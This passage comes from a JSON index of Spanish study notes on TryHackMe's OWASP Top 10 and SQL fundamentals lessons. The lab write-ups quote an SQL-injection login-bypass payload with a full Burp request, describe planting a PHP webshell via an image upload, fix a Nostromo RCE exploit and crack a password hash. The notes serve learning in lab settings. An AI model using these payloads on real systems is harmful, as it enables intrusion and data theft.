    "content": "Los sitios web tienen páginas protegidas de los visitantes normales, por ejemplo, sólo el administrador de un sitio web debería poder acceder a la página para controlar a otros usuarios. Si un visitante puede acceder a estas, entonces los controles de acceso están rotos.\n\nEste hecho puede llevar a lo siguiente:\n\n- Ser capaz de ver información sensible de otros usuarios.\n- Acceder a funcionalidades no autorizadas.\n\nPor decirlo de manera simple, esta vulnerabilidad permite a los usuarios bypassear la **autorización**.\n\nPor ejemplo, una [vulnerabilidad](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/) encontrada en 2019, permitía a un atacante obtener cada frame de un vídeo marcado como privado."
  },
  {
    "title": "19. Software Integrity Failure",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/19-software-integrity-failure/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/19. Software Integrity Failure.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Supón que tienes una página web que usa librerías de terceros guardadas en servidores externos fuera de tu control. Mientras que esto puede sonar un poco extraño, es una práctica bastante común. Toma, por ejemplo jQuery, una librería muy usada de javascript. Si quieres incluirla en tu página desde sus servidores sin descargarla:\n\n```html\n<script src=\"https://code.jquery.com/jquery-3.6.1.min.js\"></script>\n```\n\nCuando un usuario navegue hasta tu página el navegador descargará jQuery de la fuente externa especificada.\n\n![[Pasted image 20251013143945.png]]\n\nEl problema es que si un atacante consigue hackear el repositorio oficial de jQuery, podrían cambiar los contenidos de `https://code.jquery.com/jquery-3.6.1.min.js` para inyectar código malicioso. Como resultado, cualquiera visitando tu página web ejecutaría dicho código en su navegador sin saberlo.\n\nLos navegadores modernos incluyen una funcionalidad que te permite proporcionar un hash de tal manera que los recursos externos sólo se descargan si coinciden los hashes. La manera correcta de integrar librerías de terceros de forma segura sería:\n\n```html\n<script src=\"https://code.jquery.com/jquery-3.6.1.min.js\" integrity=\"sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=\" crossorigin=\"anonymous\"></script>\n```\n\nPuedes usar [SRI Hash](https://www.srihash.org/) para no tener que descargar y hashear tú mismo los archivos que te interesen."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "En esta unidad desglosaremos cada tópico del OWASP y sus vulnerabilidades, cómo ocurren y cómo explotarlas. Podremos además la teoría en práctica resolviendo desafíos.\n\n1. Broken Access Control\n2. Cryptographic Failures\n3. Injection\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable and Outdated Components\n7. Identification and Authentication Failures\n8. Software and Data Integrity Failures\n9. Security Logging & Monitoring Failures\n10. Server-Side Request Forgery (SSRF)"
  },
  {
    "title": "11. IV. Insecure Design",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/11-iv-insecure-design/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/11. IV. Insecure Design.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "El diseño inseguro se refiere a las vulnerabilidades que son inherentes a la arquitectura de la aplicación. No son vulnerabilidades por mala implementación o configuración, sino que la idea de la aplicación o parte de ella tiene una debilidad desde el inicio. Algunas, otras veces, están relacionadas con errores de los propios programadores (si por ejemplo uno añade atajos como desactivar a la validación OTP para ahorrar tiempo en el testeo de la app completa) y lo manda a producción sin corregirlo.\n\n---------------\n<h2>Reseteos de Contraseña Inseguros</h2>\nUn buen ejemplo de este tipo de vulnerabilidades ocurrió en Instagram no hace mucho (2019). Instagram permitía a los usuarios resetear su contraseña si se olvidaban de ella mandándoles un código de 6 dígitos a su móvil vía SMS. La fuerza bruta para romper el código no era válida porque instagram tenía bloqueo de intentos.\n\nUna persona encontró que ese límite sólo limitaba si los intentos venían de la misma máquina. De esta forma el atacante podía orquestar varias IPs y probar 250 intentos por cada una. Para un código de 6 dígitos tienes un total de 1.000.000 de combinaciones (000000-999999), por lo que con tan solo 1.000.000/250 = 4.000 IPs, podías romperla el 100% de las veces.\n\nFíjate cómo la vulnerabilidad está basada en la idea de que ningún usuario podría usar miles de IPs para hacer peticiones concurrentes. La mejor manera de combatir este tipo de vulnerabilidades es realizar un modelaje de amenazas al inicio.\n\n-------------------\n<h2>Challenge</h2>\n1. Entramos a la página web proporcionada.\n   ![[Pasted image 20251010184923.png]]\n2. Probamos con \"joseph\", que es la cuenta en la que debemos meternos:\n   ![[Pasted image 20251010185218.png]]\n3. No hay tantos colores, así que probaremos con eso:\n   ![[Pasted image 20251010185346.png]]\n4. Acertamos con \"green\":\n   ![[Pasted image 20251010185419.png]]\n5. Iniciamos sesión:\n   ![[Pasted image 20251010185448.png]]\n6. Dentro encontramos la flag:\n   ![[Pasted image 20251010185536.png]]\n   ![[Pasted image 20251010185548.png]]\n\n"
  },
  {
    "title": "8. Cryptographic Failures Challenge",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/8-cryptographic-failures-challenge/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/8. Cryptographic Failures Challenge.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "1. Entramos en la página:\n   ![[Pasted image 20251009211533.png]]\n2. Investigando, hacemos click en \"log in\" y al inspeccionar la página:\n   ![[Pasted image 20251009211754.png]]\n3. Seguimos el enlace hasta el endpoint \"/assets\":\n   ![[Pasted image 20251009211849.png]]\n4. A simple vista podemos observar lo que parece una base de datos `webapp.db`. Si la abrimos con sqlite3 en consola, podemos observar cositas:\n   ![[Pasted image 20251009212522.png]]\n5. Haciendo uso de Crackstation crackeamos la contraseña:\n   ![[Pasted image 20251009212930.png]]\n6. Con el usuario y la contraseña en nuestro poder nos logueamos como admin:\n   ![[Pasted image 20251009213039.png]]\n7. Así obtenemos la flag:\n   ![[Pasted image 20251009213110.png]]\n"
  },
  {
    "title": "9. III. Injection",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/9-iii-injection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/9. III. Injection.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Las debilidades de inyección son muy comunes en las aplicaciones hoy en día. Estas ocurren porque la aplicación interpreta el input controlado por el usuario como comandos o parámetros. Este tipo de vulnerabilidad depende de la tecnología que se use, algunos ejemplos son:\n\n- **Inyección SQL:** Ocurre cuando el input del usuario se pasa a queries SQL sin sanitización. Esto podría permitir al atacante acceder a información sensible.\n- **Inyección de comandos:** Ocurre cuando el input del usuario se pasa a comandos de sistema. Como resultado, el atacante puede ejecutar comandos a su antojo, pudiendo conseguir acceso a la máquina.\n\nLa defensa principal para prevenir este tipo de ataques es asegurarse de que el input controlado por el usuario no sea interpretado como queries o comandos. Hay varias maneras de hacer esto:\n\n- **Usando una lista blanca:** Cuando el input se manda al servidor, este se compara con una lista de aquellos inputs que se consideran seguros, y sólo deja pasar los que hacen match.\n- **Filtrando el input:** Si el input contiene caracteres peligrosos, estos se eliminan antes de procesarse.\n\nLos caracteres o inputs peligrosos  son cualquier input que pueda cambiar cómo la información se procesa. En vez de construir manualmente listas blancas o filtrar los inputs, existen varias librerías que pueden realizar estas acciones por nosotros."
  },
  {
    "title": "0. OWASP Top 10 - 2021",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/0-owasp-top-10-2021/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/1. Introduction]]\n[[2. Accessing Machines]]\n[[3. I. Broken Access Control]]\n[[4. Broken Access Control (IDOR Challenge)]]\n[[5. II. Cryptographic Failures]]\n[[6. Cryptographic Failures (Supporting Material 1)]]\n[[7. Cryptographic Failures (Supporting Material 2)]]\n[[8. Cryptographic Failures Challenge]]\n[[9. III. Injection]]\n[[10. III.I. Command Injection]]\n[[11. IV. Insecure Design]]\n[[12. V. Security Misconfiguration]]\n[[13. VI. Vulnerable and Outdated Components]]\n[[14. Vulnerable and Outdated Components - Exploit]]\n[[15. Vulnerable and Outdated Components - Lab]]\n[[16. VII. Identification and Authentification Failures]]\n[[17. Identification and Authetification Failures Practical]]\n[[18. VIII. Softwares and Data Integrity Failures]]\n[[19. Software Integrity Failure]][[20. Data Integrity Failure]]\n[[20. Data Integrity Failure]]\n[[21. IX. Security Logging and Monitoring Failures]]\n[[22. X. Server-Side Request Forgery (SSRF)]]\n"
  },
  {
    "title": "2. Accessing Machines",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/2-accessing-machines/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/2. Accessing Machines.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Algunas tareas requieren conectarse a una máquina virtual, para ello puedes usar la attack box o descargarte la OpenVPN de TryHackMe. Después de descargarla actívala haciendo `sudo openvpn /ruta/a/.ovpn`."
  },
  {
    "title": "13. VI. Vulnerable and Outdated Components",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/13-vi-vulnerable-and-outdated-components/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/13. VI. Vulnerable and Outdated Components.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "De forma ocasional, podemos encontrar que la compañía o entidad que estamos auditando usa un software que tiene una vulnerabilidad bien conocida.\n\nPor ejemplo, digamos que una compañía no ha actualizado su versión de WordPress desde hace años, y usando una herramienta como [WPScan](https://wpscan.com/), encontramos que es la versión 4.6. Una búsqueda rápida revelará que esta versión es vulnerable a ejecución remota de comandos sin autentificación (RCE) y puedes encontrar un exploit ya hecho en [Exploit-DB](https://www.exploit-db.com/exploits/41962).\n\nComo puedes imaginar, esto sería devastador porque requiere muy poco trabajo del lado del atacante. La situación se agrava cuando te das cuenta de lo relativamente común que es esto."
  },
  {
    "title": "15. Vulnerable and Outdated Components - Lab",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/15-vulnerable-and-outdated-components-lab/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/15. Vulnerable and Outdated Components - Lab.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "1. Navegamos a la página dada.\n   ![[Pasted image 20251011134021.png]]\n2. Buscamos por aplicaciones de tienda de libros (bookstore application):\n   ![[Pasted image 20251011134917.png]]\n3. El código que encontramos tiene ejemplo tanto por web como usando Burp Suite:\n   ```bash\n# Exploit Title: CSE Bookstore Authentication Bypass\n# Date: 27/10/2020\n# Exploit Author: Alper Basaran\n# Vendor Homepage: https://projectworlds.in/\n# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip\n# Version: 1.0\n# Tested on: Windows 10 Enterprise 1909\n\n\nCSE Bookstore is vulnerable to an authentication bypass vulnerability on the admin panel. \nBy default the admin panel is located at /admin.php and the administrator interface can be accessed by unauthorized users exploiting the SQL injection vulnerability.\n\nPayload: \nName: admin\nPass: %' or '1'='1 \n\nSample BurpSuite intercept:\n\nPOST /bookstore/admin_verify.php HTTP/1.1\nHost: 192.168.20.131\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 60\nOrigin: http://192.168.20.131\nConnection: close\nReferer: http://192.168.20.131/bookstore/admin.php\nCookie: PHPSESSID=hmqnib0ihkvo235jor7mpfoupv\nUpgrade-Insecure-Requests: 1\n\nname=admin&pass=%25%27+or+%271%27%3D%271&submit=Submit+Query\n```\n\n4. Probamos:\n   ![[Pasted image 20251011135154.png]]\n5. La contraseña funciona:\n   ![[Pasted image 20251011135812.png]]\n6. Buscamos más vulnerabilidades, ya que necesitamos acceder a `/opt/flag.txt`.\n   ![[Pasted image 20251011140737.png]]\n7. El ejecutable nos lanza un error:\n   ![[Pasted image 20251011143426.png]]\n8. Como el código no funciona a pesar de modificarlo lo leemos y vemos que está insertando una webshell en la imagen, por lo que vamos a hacerlo manualmente desde la página vulnerada de admin:\n   ![[Pasted image 20251011142510.png]]\n9. Activamos Burp Suite:\n   ![[Pasted image 20251011143810.png]]\n10. Cambiamos el valor de la imagen:\n    ![[Pasted image 20251011144637.png]]\n11. Vemos desde donde se están cargando las fotos:\n   ![[Pasted image 20251011143332.png]]\n12. Intentamos cargar la consola php:\n    ![[Pasted image 20251011144924.png]]\n13. Obtenemos la flag\n    ![[Pasted image 20251011145025.png]]\n\n"
  },
  {
    "title": "12. V. Security Misconfiguration",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/12-v-security-misconfiguration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/12. V. Security Misconfiguration.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "La configuración errónea es distinta de las Top 10 porque ocurre cuando la seguridad podía haber sido implementada correctamente pero no lo fue. Incluso si tienes las versiones lo más actualizadas posibles, la mala configuración puede vulnerar todo tu sistema.\n\nEstas incluyen:\n\n- Permisos de servicios en la nube pobremente configurados.\n- Tener habilitadas funcionalidades innecesarias como servicios, páginas o privilegios.\n- Cuentas por defecto sin cambio de credenciales.\n- Mensajes de error con demasiada información.\n- No usar HTTPS.\n\nEsta vulnerabilidad puede conducir, usualmente, a otras.\n\n-------------------------\n<h2>Debuggear Interfaces</h2>\nUna mala configuración común tiene que ver con el debugging y cómo se maneja. Si como desarrollador te olvidas de eliminar estos debugs, un atacante podría usarlos como fuente de información para romper el sistema.\n\nUn ejemplo de este tipo de vulnerabilidad es cuando Patreon fue hackeado en 2015. Cinco días antes, un investigador de seguridad le comunicó a Patreon que había encontrado una interfaz de debugging abierta para la consola Werkzeug. Esta podía ser accedida mediante URL con `/console`.\n\n-----------------\n<h2>Challenge</h2>\n1. Navegamos hasta la página proporcionada:\n   ![[Pasted image 20251010192138.png]]\n2. Allí ejecutamos el código que nos dan:\n   ![[Pasted image 20251010192245.png]]\n3. Vemos el código fuente de la app, por lo que podemos intentar leerlo:\n   ![[Pasted image 20251010192428.png]]\n"
  },
  {
    "title": "7. Cryptographic Failures (Supporting Material 2)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/7-cryptographic-failures-supporting-material-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/7. Cryptographic Failures (Supporting Material 2).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Ya vimos cómo mandar queries a una base de datos SQLite. Encontramos una colección de contraseñas en hash, una para cada usuario. En esta tarea cubriremos cómo crackearlas.\n\nAunque kali ya tiene preinstaladas herramientas específicas para este proceso, estas no están en el scope de la lección. Estaremos usando [crackstation](https://crackstation.net/). Este sitio web es impresionantemente bueno crackeando  contraseñas, aunque para hashes más complicados tendríamos que usar herramientas dedicadas.\n\nSi tratamos de descifrar la contraseña de Joy Paulson, `5f4dcc3b5aa765d61d8327deb882cf99`, obtenemos:\n\n![[Pasted image 20251009210426.png]]\n\nVemos que el hash ha sido crackeado y la contraseña expuesta. Crackstation funciona con diccionarios inmensos, si la contraseña no está en esos diccionarios será imposible descifrarla."
  },
  {
    "title": "14. Vulnerable and Outdated Components - Exploit",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/14-vulnerable-and-outdated-components-exploit/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/14. Vulnerable and Outdated Components - Exploit.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Ya que esto va de vulnerabilidades conocidas, la mayoría del trabajo ya ha sido hecho. Nuestro principal objetivo es averiguar la información del software y buscar hasta encontrar un exploit. Veamos un ejemplo.\n\n![[Pasted image 20251011132703.png]]\n\nAquí vemos la página por defecto de un servidor que corre Nostromo 1.9.6. Ahora que tenemos el nombre del software y la versión podemos usar Exploit-DB para buscar exploits para él. Por suerte para nosotros, sí que hay:\n\n![[Pasted image 20251011133205.png]]\n\nAl intentar ejecutar el código del exploit salta un problema, por eso conviene conocer lenguajes de programación, para poder arreglar pequeños bugs:\n\n```sh\nuser@linux$ python 47837.py\nTraceback (most recent call last):\n  File \"47837.py\", line 10, in <module>\n    cve2019_16278.py\nNameError: name 'cve2019_16278' is not defined\n```\n\nEn nuestro caso, hay que comentar una línea:\n\n```python\n# Exploit Title: nostromo 1.9.6 - Remote Code Execution\n# Date: 2019-12-31\n# Exploit Author: Kr0ff\n# Vendor Homepage:\n# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz\n# Version: 1.9.6\n# Tested on: Debian\n# CVE : CVE-2019-16278\n\ncve2019_16278.py  # This line needs to be commented.\n\n#!/usr/bin/env python\n```\n\nPor último, volvemos a probar y boom, RCE conseguida!"
  },
  {
    "title": "2. Databases 101",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/2-databases-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/2. Databases 101.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "<h2>Introduciendo las Bases de Datos</h2>\nLas bases de datos son colecciones ordenadas de información estructurada fácilmente accesible. Las bases de datos se usan de manera intensiva. Todo el mundo/programas/empresas pueden y deberían usarlas para almacenar cualquier tipo de información.\n\n-----------------------\n<h2>Diferentes Tipos de Bases de Datos</h2>\nTiene sentido que algo tan popularmente utilizado durante tanto tiempo como las bases de datos tuvieran varias manearas de implementarse, y así es. Por ahora nos centraremos en las bases de datos relacionales (SQL) y no relacionales (NoSQL).\n\n**Bases de Datos Relacionales:** Guardan información estructurada. Por ejemplo la lista de un usuario consistiría de: `nombre, apellido, email, username y contraseña`. Esta información es guardada en filas y columnas en una tabla. Entonces pueden hacerse relaciones entre tablas, por ejemplo: `user e historial_pedidos`.\n\n**Bases de Datos No Relacionales:** En vez de guardar información como la de arriba, esta lo hace en un formato no tabular. Aquí se muestra un ejemplo:\n\n```bash\n {\n    _id: ObjectId(\"4556712cd2b2397ce1b47661\"),\n    name: { first: \"Thomas\", last: \"Anderson\" },\n    date_of_birth: new Date('Sep 2, 1964'),\n    occupation: [ \"The One\"],\n    steps_taken : NumberLong(4738947387743977493)\n}\n```\n\n\nEn términos de qué tipo de base de datos deberías escoger, siempre se reduce al contexto de su creación. Si la exactitud se precisa, las relacionales son mejores mientras que las no relacionales son mejores si la información introducida puede variar mucho en formato o tamaño pero necesita ser recopilada en el mismo sitio.\n\n--------------------\n<h2>Tablas, Filas y Columnas</h2>\nAhora que hemos definido los dos tipos, nos centraremos en bases de datos relacionales. Empezaremos cubriendo las tablas, filas y columnas. \n\nToda la información guardada en una BDR será almacenada en una **tabla**, por ejemplo si fuera una tienda de libros, podría tener una tabla llamada \"Libros o \"Books\". Para crear esta tabla necesitarías definir qué tipo de información es relevante almacenar, por ejemplo: `id, name, published_date`. Estas serían nuestras **columnas**. Al definir las columnas también tenemos que definir qué tipo de datos van dentro. Los tipos pueden ser varios dependiendo de qué datos vayamos a guardar: `INT` para enteros, `DATE` para fechas, `FLOAT` para decimales, etc. Una vez creada podemos empezar a añadir entradas con datos como `name: \"Android Security Internals\", id: \"1\", published_date: \"2014-10-14\"`. Esto forma una **fila**.\n\n---------------------\n<h2>Claves Primarias y Foráneas</h2>\nPuede que queramos relacionar una tabla que contiene los libros con otra tabla que contiene los autores. En este caso podríamos establecer una relación entre las tablas.\n\nEn nuestra tabla de libros, el `id` sería nuestra clave primaria, porque es única e irrepetible. Así mismo, en la tabla de autores el `id` podría ser nuestra PK (Primary Key). Y para relacionarlas añadiríamos una FK (Foreign Key o Clave Foránea) en la tabla de libros con el nombre de columna `id_autor`, donde introduciríamos el id del autor de la tabla autor.\n\n![[Pasted image 20250930233218.png]]\n"
  },
  {
    "title": "3. SQL",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/3-sql/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/3. SQL.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "<h2>¿Qué es SQL?</h2>\nLas bases de datos normalmente se gestionan con un Sistema Gestor de Bases de Datos (DBMS). Sirviendo como una interfaz entre el usuario y la base de datos y sirve para hacer consultas, actualizaciones  y gestiones. Algunos ejemplos son MySQL, MongoDB, Oracle Database y MariaDB.\n\nLa interacción entre el usuario final y la base de datos puede ser hecha usando SQL (Structured Query Language).\n\n--------------------\n<h2>Los beneficios de SQL y las Bases de Datos Relacionales</h2>\nEstos son algunos de los beneficios  de usar SQL:\n\n- **Rápido:** Las bases de datos relacionales pueden devolver trozos masivos de información gracias a lo poco que ocupan y la alta velocidad de procesado.\n- **Fácil de Aprender:** Al contrario que muchos lenguajes de programación, SQL está escrito en inglés simple. Gracias a esto, los usuarios pueden concentrarse en aprender sus funciones y sintaxis.\n- **Confiable:** Las bases de datos pueden garantizar cierto nivel de precisión cuando hablamos del tipo de información ya que tiene que cumplir ciertos requisitos para ser introducidos.\n- **Flexible:** SQL ofrece todo tipo de capabilidades cuando a mandar queries a la base de datos se refiere.\n\n"
  },
  {
    "title": "4. Database and Table Statements",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/4-database-and-table-statements/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/4. Database and Table Statements.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "<h2>Hora de Aprender</h2>\nAhora la parte divertida. Hora de aprender SQL y como interactuar con bases de datos. En esta lección vamos a empezar por aprender y usar los statements de tablas y bases de datos.\n\n-----------------\n<h2>Statements de Bases de Datos</h2>\n<h4>CREATE DATABASE</h4>\nSi necesitamos una base de datos nueva, el primer paso que deberíamos tomar el crearla. Esto sólo puede ser hecho en SQL usando el comando `CREATE DATABASE`. Se usa la siguiente sintaxis:\n\n```SQL\nmysql> CREATE DATABASE database_name;\n```\n\n<h4>SHOW DATABASES</h4>\nAhora que hemos creado una base de datos, podemos verla usando `SHOW DATABASES`. Esto nos devolverá una lista de todas las bases de datos que tenemos.\n\n```SQL\nmysql> SHOW DATABASES;\n```\n\n<h4>USE DATABASE</h4>\nSi queremos interactuar con la base de datos, primero debemos decirle al DBMS que queremos usar esa base de datos. Si tuviéramos, por ejemplo, una base de datos llamada \"library\", usaríamos:\n\n```sql\nmysql> USE library;\n```\n\n<h4>DROP DATABASE</h4>\nUna vez que una base de datos ya no es necesaria, podemos eliminarla con el comando `DROP` con la siguiente sintaxis.\n\n```sql\nmysql> DROP database library;\n```\n\n--------------\n<h2>Statements de Tablas</h2>\nAhora que podemos crear, listar, usar y eliminar bases de datos toca aprender a poblar esas bases de datos con tablas e interactuar con ellas.\n\n<h4>CREATE TABLE</h4>\nSiguiendo la misma lógica que para las bases de datos, para las tablas también se usa `CREATE`. Sin embargo la sintaxis es sustancialmente diferente. Para crear una tabla, debemos conocer los datos que vamos a introducir en ella:\n\n```sql\nmysql> CREATE TABLE inventario_libros (\n\tid_libro INT AUTO_INCREMENT PRIMARY KEY,\n\tnombre_libro VARCHAR(255) NOT NULL,\n\tfecha_publicacion DATE\n);\n```\n\n<h4>SHOW TABLES</h4>\nIgual que podemos listar bases de datos, podemos hacerlo con las tablas.\n\n```sql\nmysql> SHOW TABLES;\n```\n\n---------------\n<h2>DESCRIBE</h2>\nSi queremos qué tipo de columnas hay en una tabla, podemos describirlas con el comando `DESCRIBE`. Esto mostrará la tabla con la composición de esta:\n\n```sql\nmysql> DESCRIBE inventario_libros;\n```\n\nArrojará un output así:\n\n```sql\n+-------------------+--------------+------+-----+---------+----------------+\n| Field             | Type         | Null | Key | Default | Extra          |\n+-------------------+--------------+------+-----+---------+----------------+\n| id_libro          | int          | NO   | PRI | NULL    | auto_increment |\n| nombre_libro      | varchar(255) | NO   |     | NULL    |                |\n| fecha_publicacion | date         | YES  |     | NULL    |                |\n+-------------------+--------------+------+-----+---------+----------------+\n3 rows in set (0.02 sec)\n```\n\n<h4>ALTER</h4>\nUna vez creada la tabla, puede llegar el momento en el que nuestras necesidades cambien y entonces tendremos que alterar la tabla. Esto puede hacerse usando `ALTER`. Imaginemos que ahora queremos tener una columna que tenga el número de páginas de cada libro, para ello:\n\n```sql\nmysql> ALTER TABLE inventario_libros\nADD recuento_paginas INT;\n```\n\nSe puede usar también para renombrar o eliminar columnas.\n\n<h4>DROP</h4>\nIgual que hacer drop de una base de datos, `DROP` elimina una tabla:\n\n```sql\nmysql> DROP TABLE inventario_libros;\n```\n"
  },
  {
    "title": "8. Functions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/8-functions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/8. Functions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "Al trabajar con datos, las funciones pueden ayudarnos a manipularlos. Veamos algunas de las más usadas.\n\n------------------\n<h2>Funciones String</h2>\nSon funciones que realizan operaciones en una string, devolviendo un valor asociado con ella.\n\n<h4>Función CONCAT()</h4>\nEsta función se usa para juntar dos o más strings.\n\n```sql\nmysql> SELECT CONCAT(name, \" is a type of \", category, \" book.\") AS book_info FROM books;\n+------------------------------------------------------------------+\n| book_info                                                         |\n+------------------------------------------------------------------+\n| Android Security Internals is a type of Defensive Security book. |\n| Bug Bounty Bootcamp is a type of Offensive Security book.        |\n| Car Hacker`s Handbook is a type of Offensive Security book.      |\n| Designing Secure Software is a type of Defensive Security book.  |\n| Ethical Hacking is a type of Offensive Security book.            |\n+------------------------------------------------------------------+\n\n5 rows in set (0.00 sec)\n```\n\n<h4>Función GROUP_CONCAT()</h4>\nEsta nos ayuda a concatenar información de múltiples filas en un campo.\n\n```sql\nmysql> SELECT category, GROUP_CONCAT(name SEPARATOR \", \") AS books\n    FROM books\n    GROUP BY category;\n+--------------------+----------------------------------------------------------+\n| category           | books                                                    |\n+--------------------+----------------------------------------------------------+\n| Defensive Security | Android Security Intern, Designing Secure Software       |\n| Offensive Security | Bug Bounty Bootcamp, Car HackerHandbook, Ethical Hacking |\n+--------------------+----------------------------------------------------------+\n\n2 rows in set (0.01 sec)\n```\n\n<h4>Función SUBSTRING()</h4>\nEsta devuelve una substring de una string que coincida con los criterios de filtrado.\n\n```sql\nmysql> SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;\n+----------------+\n| published_year |\n+----------------+\n| 2014           |\n| 2021           |\n| 2016           |\n| 2021           |\n| 2021           |\n+----------------+\n\n5 rows in set (0.00 sec)\n```\n\nExtrae del carácter 1 al 4 y lo guarda en la columna \"published_year\".\n\n<h4>Función LENGTH()</h4>\nDevuelve el número de caracteres de una string.\n\n```sql\nmysql> SELECT LENGTH(name) AS name_length FROM books;\n```\n\n---------------------\n<h2>Funciones de Agregación</h2>\nEstas funciones agregan los valores de múltiples filas con un criterio específico.\n\n<h4>Función COUNT()</h4>\nEsta devuelve el número de registros de una 